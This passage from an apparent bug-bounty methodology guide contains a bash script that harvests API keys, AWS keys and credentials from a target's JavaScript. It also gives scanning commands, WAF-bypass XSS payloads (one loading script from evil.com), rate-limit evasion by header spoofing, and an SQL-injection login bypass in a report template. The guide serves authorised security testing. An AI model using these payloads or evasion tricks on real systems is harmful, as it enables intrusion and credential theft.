        echo "$js_content" | grep -oE 'AKIA[0-9A-Z]{16}' | sed "s|^|$js_url: AWS Access Key: |" >> "$JS_DIR/secrets/aws_keys.txt"
        
        # Extract Google API keys
        echo "$js_content" | grep -oE 'AIza[0-9A-Za-z_-]{35}' | sed "s|^|$js_url: Google API Key: |" >> "$JS_DIR/secrets/google_keys.txt"
        
        # Extract endpoints
        echo "$js_content" | grep -oE '"/[a-zA-Z0-9_/.-]*"' | sed 's/"//g' | grep -E '^/[a-zA-Z]' | sed "s|^|https://$TARGET|" >> "$JS_DIR/endpoints/extracted_endpoints.txt"
        
        # Extract URLs
        echo "$js_content" | grep -oE 'https?://[^"'\''<>\s]+' >> "$JS_DIR/endpoints/external_urls.txt"
        
        # Check for DOM XSS sinks
        echo "$js_content" | grep -nE "(innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval|Function|execScript)" | sed "s|^|$js_url:|" >> "$JS_DIR/analysis/dom_sinks.txt"
        
        # Check for sensitive comments
        echo "$js_content" | grep -nE '//.*|/\*.*\*/' | grep -iE '(todo|fixme|hack|temp|debug|test|password|key|secret)' | sed "s|^|$js_url:|" >> "$JS_DIR/analysis/sensitive_comments.txt"
        
        # Extract base64 encoded data
        echo "$js_content" | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | while read b64; do
            decoded=$(echo "$b64" | base64 -d 2>/dev/null)
            if echo "$decoded" | grep -qE '(key|token|secret|password|api)'; then
                echo "$js_url: $b64 -> $decoded" >> "$JS_DIR/secrets/base64_secrets.txt"
            fi
        done
        
        # Check for hardcoded credentials
        echo "$js_content" | grep -iE '(username|user|login)["\s]*[:=]["\s]*[a-zA-Z0-9_-]+' | sed "s|^|$js_url: |" >> "$JS_DIR/secrets/hardcoded_creds.txt"
        echo "$js_content" | grep -iE '(password|pass|pwd)["\s]*[:=]["\s]*[a-zA-Z0-9_-]+' | sed "s|^|$js_url: |" >> "$JS_DIR/secrets/hardcoded_creds.txt"
    fi
}

export -f analyze_js_file
export TARGET JS_DIR

# Analyze files in parallel
cat "$JS_DIR/collection/all_js_files.txt" | head -50 | parallel -j 10 analyze_js_file {}

# Phase 3: Generate Report
echo "[+] Phase 3: Generating analysis report"

# Count findings
API_KEYS=$(wc -l < "$JS_DIR/secrets/api_keys.txt" 2>/dev/null || echo "0")
AWS_KEYS=$(wc -l < "$JS_DIR/secrets/aws_keys.txt" 2>/dev/null || echo "0")
GOOGLE_KEYS=$(wc -l < "$JS_DIR/secrets/google_keys.txt" 2>/dev/null || echo "0")
ENDPOINTS=$(wc -l < "$JS_DIR/endpoints/extracted_endpoints.txt" 2>/dev/null || echo "0")
DOM_SINKS=$(wc -l < "$JS_DIR/analysis/dom_sinks.txt" 2>/dev/null || echo "0")
COMMENTS=$(wc -l < "$JS_DIR/analysis/sensitive_comments.txt" 2>/dev/null || echo "0")

cat > "$JS_DIR/js_analysis_report.txt" << EOF
=== JavaScript Security Analysis Report ===
Target: $TARGET
Date: $(date)
Files Analyzed: $JS_COUNT

FINDINGS SUMMARY:
- API Keys/Tokens: $API_KEYS
- AWS Keys: $AWS_KEYS  
- Google API Keys: $GOOGLE_KEYS
- Endpoints Extracted: $ENDPOINTS
- DOM XSS Sinks: $DOM_SINKS
- Sensitive Comments: $COMMENTS

CRITICAL FILES TO REVIEW:
- secrets/api_keys.txt (API keys and tokens)
- secrets/aws_keys.txt (AWS access keys)
- secrets/google_keys.txt (Google API keys)
- secrets/hardcoded_creds.txt (Hardcoded credentials)
- analysis/dom_sinks.txt (Potential DOM XSS)
- endpoints/extracted_endpoints.txt (Hidden endpoints)

MANUAL TESTING RECOMMENDATIONS:
1. Validate all extracted API keys
2. Test extracted endpoints for vulnerabilities
3. Analyze DOM XSS sinks for exploitation
4. Review sensitive comments for information disclosure
5. Test hardcoded credentials for validity

NEXT STEPS:
1. Test extracted endpoints with security tools
2. Validate API keys and check permissions
3. Analyze DOM manipulation for XSS
4. Check for prototype pollution vulnerabilities
EOF

echo "🎉 JavaScript analysis completed!"
echo "📁 Results saved in: $JS_DIR/"
echo "📊 Found $API_KEYS potential secrets and $ENDPOINTS endpoints"
```

---

## 🎯 **ADVANCED METHODOLOGY TIPS**

### **Methodology 1: The Layered Approach**
```bash
# Layer 1: Passive reconnaissance (Stealth)
subfinder -d target.com -all -silent
waybackurls target.com
curl -s "https://crt.sh/?q=%.target.com&output=json"

# Layer 2: Active enumeration (Detectable)
amass enum -active -d target.com
nmap -sS -T4 target.com

# Layer 3: Vulnerability assessment (Noisy)
nuclei -list urls.txt -t ~/nuclei-templates/
sqlmap -m params.txt --batch
```

### **Methodology 2: The Time-Based Approach**
```bash
# Week 1: Reconnaissance and asset discovery
# Week 2: Automated vulnerability scanning
# Week 3: Manual testing and exploitation
# Week 4: Advanced techniques and reporting
```

### **Methodology 3: The Severity-First Approach**
```bash
# Priority 1: Critical vulnerabilities (RCE, SQLi, Auth bypass)
nuclei -list urls.txt -severity critical
sqlmap -m params.txt --level=3 --risk=3

# Priority 2: High severity (XSS, IDOR, Sensitive data exposure)
dalfox pipe < params.txt
# Test for IDOR manually

# Priority 3: Medium/Low severity (Info disclosure, Misconfigurations)
nuclei -list urls.txt -severity medium,low
```

---

## 🛡️ **DEFENSIVE EVASION TECHNIQUES**

### **WAF Bypass Techniques**
```bash
# 1. Parameter pollution
curl "https://target.com/search?q=normal&q=<script>alert(1)</script>"

# 2. Encoding bypass
curl "https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"  # URL encoding
curl "https://target.com/search?q=\u003cscript\u003ealert(1)\u003c/script\u003e"  # Unicode

# 3. Case variation
curl "https://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>"

# 4. Comment insertion
curl "https://target.com/search?q=<script/**/src=//evil.com></script>"

# 5. Alternative payloads
curl "https://target.com/search?q=<img src=x onerror=alert(1)>"
```

### **Rate Limiting Bypass**
```bash
# 1. IP rotation with X-Forwarded-For
for i in {1..100}; do
  curl -H "X-Forwarded-For: 192.168.1.$((RANDOM % 255))" "https://target.com/api/endpoint"
done

# 2. User-Agent rotation
USER_AGENTS=("Mozilla/5.0..." "Chrome/..." "Safari/...")
for ua in "${USER_AGENTS[@]}"; do
  curl -H "User-Agent: $ua" "https://target.com/api/endpoint"
done

# 3. Distributed requests
curl "https://target.com/api/endpoint" --proxy proxy1:8080 &
curl "https://target.com/api/endpoint" --proxy proxy2:8080 &
curl "https://target.com/api/endpoint" --proxy proxy3:8080 &
```

---

## 📊 **REPORTING BEST PRACTICES**

### **Vulnerability Report Template**
```markdown
# Vulnerability Report: [VULNERABILITY_NAME]

## Executive Summary
Brief description of the vulnerability and its impact.

## Vulnerability Details
- **Severity**: Critical/High/Medium/Low
- **CVSS Score**: X.X
- **Affected URL**: https://target.com/vulnerable/endpoint
- **Vulnerability Type**: SQL Injection/XSS/IDOR/etc.

## Technical Details
### Request
```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "admin'--", "password": "anything"}
```

### Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"token": "jwt_token_here", "role": "admin"}
```

## Impact
- Data breach potential
- Privilege escalation
- Account takeover

## Proof of Concept
Step-by-step reproduction steps with screenshots.

## Remediation
- Input validation
- Parameterized queries
- WAF implementation

## References
- OWASP Top 10
- CWE-89: SQL Injection
```

### **Automated Report Generation**
```bash
#!/bin/bash
# Generate comprehensive report

TARGET=$1
REPORT_DIR="reports/$(date +%Y%m%d_%H%M%S)"
mkdir -p $REPORT_DIR

# Collect all findings
echo "# Bug Hunting Report for $TARGET" > $REPORT_DIR/report.md
echo "Generated on: $(date)" >> $REPORT_DIR/report.md
echo "" >> $REPORT_DIR/report.md

# Statistics
echo "## Statistics" >> $REPORT_DIR/report.md
echo "- Subdomains found: $(wc -l < recon/subdomains/all_subs.txt)" >> $REPORT_DIR/report.md
echo "- Live hosts: $(wc -l < recon/alive_urls.txt)" >> $REPORT_DIR/report.md
echo "- URLs collected: $(wc -l < recon/urls/all_urls.txt)" >> $REPORT_DIR/report.md

# Critical findings
echo "## Critical Findings" >> $REPORT_DIR/report.md
grep -i "critical" scans/* | head -10 >> $REPORT_DIR/report.md

# Generate HTML report
pandoc $REPORT_DIR/report.md -o $REPORT_DIR/report.html
```

---

**Happy Bug Hunting! 🐛🔍**

*Remember: With great power comes great responsibility. Always hunt ethically!*